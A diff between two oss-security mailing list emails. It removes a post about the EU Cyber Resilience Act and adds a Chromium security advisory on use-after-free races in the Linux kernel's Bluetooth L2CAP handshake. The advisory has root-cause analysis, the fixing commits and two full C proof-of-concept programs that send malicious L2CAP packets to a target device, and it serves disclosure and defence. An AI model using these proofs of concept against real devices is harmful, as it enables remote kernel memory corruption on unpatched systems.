@@ -1,4 +1,4 @@
-Received: (qmail 17749 invoked by uid 550); 5 Oct 2023 15:09:24 -0000
+Received: (qmail 5857 invoked by uid 550); 14 Dec 2022 18:16:03 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,66 +7,531 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 17706 invoked from network); 5 Oct 2023 15:09:23 -0000
-From: "David A. Wheeler" <dwheeler@dwheeler.com>
-Content-Type: text/plain;
-	charset=utf-8
-Content-Transfer-Encoding: quoted-printable
-Mime-Version: 1.0 (Mac OS X Mail 16.0 \(3731.700.6\))
-Message-Id: <1061E5A7-416D-4C7A-A2CC-AA3617ACAE13@dwheeler.com>
-Date: Thu, 5 Oct 2023 11:08:51 -0400
+Received: (qmail 32300 invoked from network); 14 Dec 2022 18:13:44 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=chromium.org; s=google;
+        h=cc:to:subject:message-id:date:from:mime-version:from:to:cc:subject
+         :date:message-id:reply-to;
+        bh=QXBI5P2B+67yYNWdQ+HBPyTuUxpqNo79ATwV5IOE9RY=;
+        b=DNrSF0E7icYwW6b2cDcKNn4kEXdT7sq0QJWt1FPZmmC31f2K+0cQUK/Mj5yWONjfww
+         LwIKoVqJbyIL9mLVK3uC9eAAwZ37D7t2SOMU4BoBKYX/RXpZhUmBQ/WK9xDUC7j/xylT
+         EpE9XFwyA46rFOI5vcfb+EljUF8Ej2j0VAMfo=
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20210112;
+        h=cc:to:subject:message-id:date:from:mime-version:x-gm-message-state
+         :from:to:cc:subject:date:message-id:reply-to;
+        bh=QXBI5P2B+67yYNWdQ+HBPyTuUxpqNo79ATwV5IOE9RY=;
+        b=TQiwGotvIDzMgeC8K9qVZ+8YRwEgtUXf1bgMphCsFE9hijKPFR3f9+9Z2kcYxmbzdL
+         OJDRZkuSbWoWJcBnaqCwEG9ZPJwGDwN/PcjbsGT8VaZZxJlME0c3VYdE9xXk6giXIE6F
+         qAePT8IcoFKUdc3p2IuFZ6SKWj+UZRwyRYzs8k58S5odgwteJC3V/sH1DZs7v7iBNgwA
+         HSF3w80rhqYAtIk/jPDtNsXgMCjRJCL1mIhzMVhIqdlXPCOFLtZqnEh27Pc6r5h70EMz
+         M/iMYrias0p02W/0UDvITplunPJPUYHQhJtDJbQFOkie2dNCwi9QAUEH+CkR9Dg4Rovz
+         cLlQ==
+X-Gm-Message-State: ANoB5pmsYnV2qjl2pYXRyZYm2yyOILmOcZjcRtikvms3qsPUEQprQhHj
+	i5F6Ome434481PnvDY+6mAhl4AOXB2hhZK5SKV4jgv3Na7rWLKTee/cBEw==
+X-Google-Smtp-Source: AA0mqf5hbTaSGftEJx6o1Sp8ht5jR6M5FG0h/h3qzMeQoORtyFFiIl1MffXUBtgOOyD4WMGIYSzEgRLBWiidQ9ga3Kc=
+X-Received: by 2002:a02:8818:0:b0:38a:5560:60db with SMTP id
+ r24-20020a028818000000b0038a556060dbmr9751349jai.117.1671041612477; Wed, 14
+ Dec 2022 10:13:32 -0800 (PST)
+MIME-Version: 1.0
+From: Rafael Correa De Ysasi <rcorreadeysasi@chromium.org>
+Date: Wed, 14 Dec 2022 13:13:21 -0500
+Message-ID: <CAFXgH+PXHvA8ueX5P2yYHWeOOdkkPjQLHnG9c1gNd53Y1Ekm1Q@mail.gmail.com>
 To: oss-security@lists.openwall.com
-X-Mailer: Apple Mail (2.3731.700.6)
-Subject: [oss-security] European Union Cyber Resilience Act (CRA)
+Cc: 3pvd@google.com
+Content-Type: multipart/alternative; boundary="000000000000b7a4ee05efcdb169"
+Subject: [oss-security] Linux Kernel: UAF in Bluetooth L2CAP Handshake
 
-Solar Designed posted on October 1, 2023:
-> The talk... starts with a mention of the European Union Cyber Resiliance =
-Act (CRA)
-> and how it is problematic for Open Source...
-> (If we want to discuss in here, which I'm not sure of, please start a
-> separate thread for this sub-topic, do not just reply to this one.)
+--000000000000b7a4ee05efcdb169
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
 
-Fair enough. The CRA *definitely* impacts open source software,
-and it includes security-related requirements. So it seems on-topic for thi=
-s mailing list, at
-least to note that *many* people find the CRA concerning & to point to more=
- information.
+Summary
 
-I think a good place to start is "Understanding the Cyber Resilience Act:
-What Everyone involved in Open Source Development Should Know" from the Lin=
-ux Foundation:
-https://www.linuxfoundation.org/blog/understanding-the-cyber-resilience-act
+There are use-after-free vulnerabilities in the Linux kernel's
+net/bluetooth/l2cap_core.c's l2cap_connect and l2cap_le_connect_req functio=
+ns
+which may allow code execution and leaking kernel memory (respectively)
+remotely via Bluetooth.
 
-As currently written, individual developers of OSS are "probably excluded b=
-y the CRA requirements, even if you occasionally accept donations. But if y=
-ou regularly charge or accept recurring donations from commercial entities =
-(for example, if you do open source consulting), you=E2=80=99ll likely be c=
-overed by the CRA."
-The bigger problem is that nonprofits & private companies are expected to a=
- lot of things that don't make much sense. As noted, "the assumptions the C=
-RA makes about software manufacturers do not necessarily hold for open sour=
-ce software developers."
+The l2cap_le_connect_req bug was introduced in commit 27e2d4c
+<https://github.com/torvalds/linux/commit/27e2d4c8d28be1d1b4ecfbffab572d7db=
+d35254d>
+(version:
+3.12.0, date: 2013-Dec-05), the SMP channel is available since commit
+70db83c
+<https://github.com/torvalds/linux/commit/70db83c4bcdc1447bbcb318389561c90d=
+7056b18>
+(version:
+3.16.0, date: 2014-Aug-14).
+Severity
 
-The Linux Foundation EU has a page about the CRA:
-https://linuxfoundation.eu/cyber-resilience-act
-... it has many links, and is urging people work to #FixTheCRA.
+Moderate
+Proof of Concept
 
-Many organizations *have* been trying to get EU regulators to fix the CRA. =
-This isn't a case where no one spoke up. The problem is that for the most p=
-art their concerns have been ignored by regulators:
-https://www.globenewswire.com/news-release/2023/04/17/2647861/0/en/The-Ecli=
-pse-Foundation-and-Leading-Open-Source-Organisations-Deliver-Open-Letter-to=
--European-Commission-Regarding-the-Cyber-Resilience-Act.html
+*UAF read in l2cap_le_connect_req*
 
-I think the overall *goals* of the CRA are laudable. However, when evaluati=
-ng laws & regulations you should always IGNORE their goals, because their g=
-oals are IRRELEVANT. What matters is what the laws and regulations will act=
-ually *CAUSE*. Put another way, RESULTS are the *only* legitimate basis for=
- evaluating laws and regulations. In this case, I think too many regulators=
- are focused on theoretical goals while ignoring what will actually happen.
+*```*
 
-Full disclosure: I work for the Linux Foundation, but I'm just speaking for=
- myself here.
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <sys/uio.h>
+#include <bluetooth/bluetooth.h>
+#include <bluetooth/l2cap.h>
+#include <bluetooth/hci.h>
+#include <bluetooth/hci_lib.h>
+typedef struct l2cap_le_conn_req {
+        uint16_t     psm;
+        uint16_t     scid;
+        uint16_t     mtu;
+        uint16_t     mps;
+        uint16_t     credits;
+} __attribute__ ((packed)) l2cap_le_conn_req;
+int hci_send_acl_data(int hci_socket, uint16_t hci_handle, void *data,
+uint16_t data_length) {
+  uint8_t type =3D HCI_ACLDATA_PKT;
+  uint16_t BCflag =3D 0x0000;
+  uint16_t PBflag =3D 0x0002;
+  uint16_t flags =3D ((BCflag << 2) | PBflag) & 0x000F;
 
---- David A. Wheeler
+  hci_acl_hdr hdr;
+  hdr.handle =3D htobs(acl_handle_pack(hci_handle, flags));
+  hdr.dlen =3D data_length;
 
+  struct iovec iv[3];
+
+  iv[0].iov_base =3D &type;
+  iv[0].iov_len =3D 1;
+  iv[1].iov_base =3D &hdr;
+  iv[1].iov_len =3D HCI_ACL_HDR_SIZE;
+  iv[2].iov_base =3D data;
+  iv[2].iov_len =3D data_length;
+
+  return writev(hci_socket, iv, sizeof(iv) / sizeof(struct iovec));
+}
+
+#define L2CAP_CID_LE_SIGNALING  0x0005
+#define L2CAP_LE_CONN_REQ       0x14
+#define L2CAP_CID_SMP           0x0006
+#define L2CAP_CID_SMP_BREDR     0x0007
+int main(int argc, char **argv) {
+  if (argc !=3D 2) {
+    printf("Usage: %s MAC_ADDR\n", argv[0]);
+    return 1;
+  }
+
+  bdaddr_t dst_addr;
+  str2ba(argv[1], &dst_addr);
+
+  printf("[*] Resetting hci0 device...\n");
+  system("sudo hciconfig hci0 down");
+  system("sudo hciconfig hci0 up");
+
+  printf("[*] Opening hci device...\n");
+  struct hci_dev_info di;
+  int hci_device_id =3D hci_get_route(NULL);
+  int hci_socket =3D hci_open_dev(hci_device_id);
+  if (hci_devinfo(hci_device_id, &di) < 0) {
+    perror("hci_devinfo");
+    return 1;
+  }
+
+  struct hci_filter flt;
+  hci_filter_clear(&flt);
+  hci_filter_all_ptypes(&flt);
+  hci_filter_all_events(&flt);
+  if (setsockopt(hci_socket, SOL_HCI, HCI_FILTER, &flt, sizeof(flt)) < 0) {
+    perror("setsockopt(HCI_FILTER)");
+    return 1;
+  }
+
+  int opt =3D 1;
+  if (setsockopt(hci_socket, SOL_HCI, HCI_DATA_DIR, &opt, sizeof(opt)) < 0)=
+ {
+    perror("setsockopt(HCI_DATA_DIR)");
+    return 1;
+  }
+
+  printf("[*] Connecting to victim...\n");
+
+  struct sockaddr_l2 laddr =3D {0};
+  laddr.l2_family =3D AF_BLUETOOTH;
+  laddr.l2_bdaddr_type =3D BDADDR_LE_PUBLIC;
+  laddr.l2_bdaddr =3D di.bdaddr;
+
+  struct sockaddr_l2 raddr =3D {0};
+  raddr.l2_family =3D AF_BLUETOOTH;
+  raddr.l2_bdaddr_type =3D BDADDR_LE_PUBLIC;
+  raddr.l2_bdaddr =3D dst_addr;
+
+  int l2_sock;
+  printf("[*] socket\n");
+  if ((l2_sock =3D socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
+    perror("socket");
+    return 1;
+  }
+
+  printf("[*] bind\n");
+  if (bind(l2_sock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
+    perror("bind");
+    return 1;
+  }
+
+  printf("[*] connect\n");
+  if (connect(l2_sock, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
+    perror("connect");
+    return 1;
+  }
+
+  printf("[*] getsockopt\n");
+  struct l2cap_conninfo l2_conninfo;
+  socklen_t l2_conninfolen =3D sizeof(l2_conninfo);
+  if (getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &l2_conninfo,
+&l2_conninfolen) < 0) {
+    perror("getsockopt");
+    return 1;
+  }
+
+  uint16_t hci_handle =3D l2_conninfo.hci_handle;
+  printf("[+] HCI handle: %x\n", hci_handle);
+
+  struct {
+    l2cap_hdr hdr;
+    l2cap_cmd_hdr cmd_hdr;
+    l2cap_le_conn_req req;
+  } packet =3D {0};
+  packet.hdr.len =3D htobs(sizeof(packet) - L2CAP_HDR_SIZE);
+  packet.hdr.cid =3D htobs(L2CAP_CID_LE_SIGNALING);
+  packet.cmd_hdr.code =3D L2CAP_LE_CONN_REQ;
+  packet.cmd_hdr.ident =3D 0x1;
+  packet.cmd_hdr.len =3D sizeof(packet.req);
+  packet.req.psm =3D htobs(0);
+  packet.req.scid =3D htobs(0x42);
+  packet.req.mtu =3D htobs(23);
+  packet.req.mps =3D htobs(23);
+  packet.req.credits =3D htobs(0xff);
+
+  printf("[*] Sending malicious L2CAP packet...\n");
+  hci_send_acl_data(hci_socket, hci_handle, &packet, sizeof(packet));
+
+  close(l2_sock);
+  hci_close_dev(hci_socket);
+
+  return 0;
+}
+
+```
+
+*UAF write in l2cap_connect*
+
+*```*
+
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <sys/uio.h>
+#include <bluetooth/bluetooth.h>
+#include <bluetooth/l2cap.h>
+#include <bluetooth/hci.h>
+#include <bluetooth/hci_lib.h>
+int hci_send_acl_data(int hci_socket, uint16_t hci_handle, void *data,
+uint16_t data_length) {
+  uint8_t type =3D HCI_ACLDATA_PKT;
+  uint16_t BCflag =3D 0x0000;
+  uint16_t PBflag =3D 0x0002;
+  uint16_t flags =3D ((BCflag << 2) | PBflag) & 0x000F;
+
+  hci_acl_hdr hdr;
+  hdr.handle =3D htobs(acl_handle_pack(hci_handle, flags));
+  hdr.dlen =3D data_length;
+
+  struct iovec iv[3];
+
+  iv[0].iov_base =3D &type;
+  iv[0].iov_len =3D 1;
+  iv[1].iov_base =3D &hdr;
+  iv[1].iov_len =3D HCI_ACL_HDR_SIZE;
+  iv[2].iov_base =3D data;
+  iv[2].iov_len =3D data_length;
+
+  return writev(hci_socket, iv, sizeof(iv) / sizeof(struct iovec));
+}
+
+#define L2CAP_CID_SIGNALING     0x0001
+#define L2CAP_CONN_REQ          0x02
+#define L2CAP_CID_SMP           0x0006
+#define L2CAP_CID_SMP_BREDR     0x0007
+int main(int argc, char **argv) {
+  if (argc !=3D 2) {
+    printf("Usage: %s MAC_ADDR\n", argv[0]);
+    return 1;
+  }
+
+  bdaddr_t dst_addr;
+  str2ba(argv[1], &dst_addr);
+
+  printf("[*] Resetting hci0 device...\n");
+  system("sudo hciconfig hci0 down");
+  system("sudo hciconfig hci0 up");
+
+  printf("[*] Opening hci device...\n");
+  struct hci_dev_info di;
+  int hci_device_id =3D hci_get_route(NULL);
+  int hci_socket =3D hci_open_dev(hci_device_id);
+  if (hci_devinfo(hci_device_id, &di) < 0) {
+    perror("hci_devinfo");
+    return 1;
+  }
+
+  struct hci_filter flt;
+  hci_filter_clear(&flt);
+  hci_filter_all_ptypes(&flt);
+  hci_filter_all_events(&flt);
+  if (setsockopt(hci_socket, SOL_HCI, HCI_FILTER, &flt, sizeof(flt)) < 0) {
+    perror("setsockopt(HCI_FILTER)");
+    return 1;
+  }
+
+  int opt =3D 1;
+  if (setsockopt(hci_socket, SOL_HCI, HCI_DATA_DIR, &opt, sizeof(opt)) < 0)=
+ {
+    perror("setsockopt(HCI_DATA_DIR)");
+    return 1;
+  }
+
+  printf("[*] Connecting to victim...\n");
+
+  struct sockaddr_l2 laddr =3D {0};
+  laddr.l2_family =3D AF_BLUETOOTH;
+  laddr.l2_bdaddr_type =3D BDADDR_BREDR;
+  laddr.l2_bdaddr =3D di.bdaddr;
+
+  struct sockaddr_l2 raddr =3D {0};
+  raddr.l2_family =3D AF_BLUETOOTH;
+  raddr.l2_bdaddr_type =3D BDADDR_BREDR;
+  raddr.l2_bdaddr =3D dst_addr;
+
+  int l2_sock;
+  printf("[*] socket\n");
+  if ((l2_sock =3D socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
+    perror("socket");
+    return 1;
+  }
+
+  printf("[*] bind\n");
+  if (bind(l2_sock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
+    perror("bind");
+    return 1;
+  }
+
+  printf("[*] connect\n");
+  if (connect(l2_sock, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
+    perror("connect");
+    return 1;
+  }
+
+  printf("[*] getsockopt\n");
+  struct l2cap_conninfo l2_conninfo;
+  socklen_t l2_conninfolen =3D sizeof(l2_conninfo);
+  if (getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &l2_conninfo,
+&l2_conninfolen) < 0) {
+    perror("getsockopt");
+    return 1;
+  }
+
+  uint16_t hci_handle =3D l2_conninfo.hci_handle;
+  printf("[+] HCI handle: %x\n", hci_handle);
+
+  struct {
+    l2cap_hdr hdr;
+    l2cap_cmd_hdr cmd_hdr;
+    l2cap_conn_req req;
+  } packet =3D {0};
+  packet.hdr.len =3D htobs(sizeof(packet) - L2CAP_HDR_SIZE);
+  packet.hdr.cid =3D htobs(L2CAP_CID_SIGNALING);
+  packet.cmd_hdr.code =3D L2CAP_CONN_REQ;
+  packet.cmd_hdr.ident =3D 0x1;
+  packet.cmd_hdr.len =3D sizeof(packet.req);
+  packet.req.psm =3D htobs(0);
+  packet.req.scid =3D htobs(0x42);
+
+  printf("[*] Sending malicious L2CAP packet...\n");
+  hci_send_acl_data(hci_socket, hci_handle, &packet, sizeof(packet));
+
+  close(l2_sock);
+  hci_close_dev(hci_socket);
+
+  return 0;
+}
+
+```
+
+To make SMP available for BR/EDR devices (in case of a hardware supporting
+it is not available), you can force it by running: echo Y >
+/sys/kernel/debug/bluetooth/hci0/force_bredr_smp
+Further Analysis
+
+*Bug Analysis*
+There are UAF races in l2cap_connect
+<https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43=
+b5aaf/net/bluetooth/l2cap_core.c#L4113>
+ and l2cap_le_connect_req
+<https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43=
+b5aaf/net/bluetooth/l2cap_core.c#L5789>
+methods.
+After a channel is created via the new_connection callback, it is not
+locked but __set_chan_timer sets up a timer which can call
+l2cap_chan_timeout and can cleanup the channel before the method finishes,
+causing UAF read in l2cap_le_connect_req
+<https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43=
+b5aaf/net/bluetooth/l2cap_core.c#L5899>
+ and UAF write in l2cap_connect
+<https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43=
+b5aaf/net/bluetooth/l2cap_core.c#L4247>
+=2E
+
+As the channel timeout is normally 40 seconds
+<https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43=
+b5aaf/include/net/bluetooth/l2cap.h#L55>
+ (L2CAP_CONN_TIMEOUT), winning the race would be infeasible, but due to a
+bug in SMP's implementation, SMP channels created by smp_new_conn_cb
+<https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43=
+b5aaf/net/bluetooth/smp.c#L3241>
+have
+their get_sndtimeo callback set to l2cap_chan_no_get_sndtimeo which returns
+0
+<https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43=
+b5aaf/include/net/bluetooth/l2cap.h#L964>
+as
+timeout value thus causing the timer to run immediately (on a different
+thread) after the __set_chan_timer call.
+
+Note: in l2cap_le_connect_req (without FLAG_DEFER_SETUP), the timer is
+canceled via the l2cap_chan_ready call almost immediately after the
+__set_chan_timer call, but even this small time window enough for the timer
+with 0 timeout to start.
+
+Another root cause of the issue can be that the SMP channel is available
+via l2cap_global_chan_by_psm if the request contains psm=3D0. Multiple
+channels can be registered without PSM (PSM is 0, and channel is identified
+by SCID) but only one of them is returned (which needs to be SMP to be able
+to trigger the vulnerability).
+
+```
+
+static int l2cap_le_connect_req(...)
+{
+    ...
+    mutex_lock(&conn->chan_lock);
+    ...
+    chan =3D pchan->ops->new_connection(pchan); // chan is not locked
+    ...
+    __set_chan_timer(chan, chan->ops->get_sndtimeo(chan)); // triggers
+l2cap_chan_timeout running from a different thread
+    ...
+    if (test_bit(FLAG_DEFER_SETUP, &chan->flags)) { // branch usually not t=
+aken
+        ...
+    } else {
+        l2cap_chan_ready(chan); // calls __clear_chan_timer(chan), resets t=
+imer
+        result =3D L2CAP_CR_LE_SUCCESS;
+    }
+    ...
+    mutex_unlock(&conn->chan_lock); // l2cap_chan_timeout is blocked
+until this call
+    ...
+    if (chan) { // [7] UAF read
+        rsp.mtu =3D cpu_to_le16(chan->imtu);
+        rsp.mps =3D cpu_to_le16(chan->mps);
+    } else {
+    ...
+}
+
+```
+
+Similar issue within l2cap_connect:
+
+```
+
+static struct l2cap_chan *l2cap_connect(...)
+{
+    ...
+    mutex_lock(&conn->chan_lock);
+    ...
+    chan =3D pchan->ops->new_connection(pchan); // chan is not locked
+    ...
+    __set_chan_timer(chan, chan->ops->get_sndtimeo(chan)); // triggers
+l2cap_chan_timeout running from a different thread
+    ...
+    mutex_unlock(&conn->chan_lock); // l2cap_chan_timeout is blocked
+until this call
+    ...
+    if (chan && !test_bit(CONF_REQ_SENT, &chan->conf_state) && // UAF read
+        result =3D=3D L2CAP_CR_SUCCESS) {
+        u8 buf[128];
+        set_bit(CONF_REQ_SENT, &chan->conf_state); // UAF write
+        l2cap_send_cmd(conn, l2cap_get_ident(conn), L2CAP_CONF_REQ,
+                   l2cap_build_conf_req(chan, buf, sizeof(buf)), buf);
+        chan->num_conf_req++;
+    }
+    return chan;
+}
+
+```
+
+The affected code path in SMP implementation:
+
+```
+
+static inline struct l2cap_chan *smp_new_conn_cb(struct l2cap_chan *pchan)
+{
+    =E2=80=A6
+    chan->ops =3D &smp_chan_ops;
+    =E2=80=A6
+}
+static const struct l2cap_ops smp_chan_ops =3D {
+    =E2=80=A6
+    .get_sndtimeo =3D l2cap_chan_no_get_sndtimeo,
+    =E2=80=A6
+};
+static inline long l2cap_chan_no_get_sndtimeo(struct l2cap_chan *chan)
+{
+    return 0;
+}
+
+```
+
+*Reachability*
+SMP channel is available for Bluetooth Low Energy since BT 4.0 (~2009)
+which can be used to trigger the UAF read in l2cap_le_connect_req, and it
+is also available for BT BR/EDR since BT 5.2 (~2020, to support Secure
+Connections) to trigger the UAF write in l2cap_connect.
+
+No other prerequisites were found, the bugs were triggered on a
+KASAN-enabled Ubuntu 22.04 kernel (an artificial delay was added before the
+UAF read/write to make winning the race easier).
+
+Note: it is possible that the bugs can be triggered via other channels
+which may be created automatically by the specific environment.
+Patch
+
+The vulnerability was fixed by not accepting 0 as a valid PSM value in
+commit 711f8c3
+<https://github.com/torvalds/linux/commit/711f8c3fb3db61897080468586b970c87=
+c61d9e4>
+and
+by preventing l2cap_global_chan_by_psm to give back L2CAP_CHAN_FIXED channe=
+ls
+in commit f937b75
+<https://github.com/torvalds/linux/commit/f937b758a188d6fd328a81367087eddbb=
+2fce50f>
+=2E
+Timeline
+
+*Date reported*: 10/06/2022
+*Date fixed*: 10/26/2022
+*Date disclosed*: 11/28/2022
+
+--000000000000b7a4ee05efcdb169--
